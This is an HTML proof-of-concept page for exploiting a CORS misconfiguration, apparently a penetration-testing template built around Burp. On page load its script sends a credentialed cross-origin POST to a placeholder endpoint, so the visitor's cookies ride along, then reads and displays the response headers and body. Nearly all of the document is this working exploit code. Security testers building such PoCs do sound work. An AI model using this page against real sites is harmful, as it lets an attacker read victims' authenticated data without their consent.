<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS POST Exploit PoC</title>
</head>
<body>
  <h1>CORS POST Exploit PoC</h1>
  <p><strong>Status:</strong> <span id="status">Waiting…</span></p>
  <pre id="output" style="white-space: pre-wrap;"></pre>

  <script>
    const target = "target"; // Replace with actual endpoint
    const postData = {
      // Replace this with the body of your Burp POST request
      exampleKey: "exampleValue",
      action: "checkSession"
    };

    async function runPoC() {
      document.getElementById("status").textContent = "Sending POST…";

      try {
        const response = await fetch(target, {
          method: "POST",
          mode: "cors",
          credentials: "include", // Crucial to send cookies/session
          headers: {
            "Content-Type": "application/json" // Matches Burp request
          },
          body: JSON.stringify(postData)
        });

        const output = {
          status: response.status,
          statusText: response.statusText,
          headers: {},
          cookiesSent: document.cookie || "(none)"
        };

        for (let pair of response.headers.entries()) {
          output.headers[pair[0]] = pair[1];
        }

        try {
          output.body = await response.text();
        } catch (e) {
          output.body = "(Failed to read body)";
        }

        document.getElementById("status").textContent = `✅ ${response.status} ${response.statusText}`;
        document.getElementById("output").textContent = JSON.stringify(output, null, 2);
      } catch (err) {
        document.getElementById("status").textContent = "❌ Request failed";
        document.getElementById("output").textContent = err.toString();
      }
    }

    runPoC();
  </script>
</body>
</html>
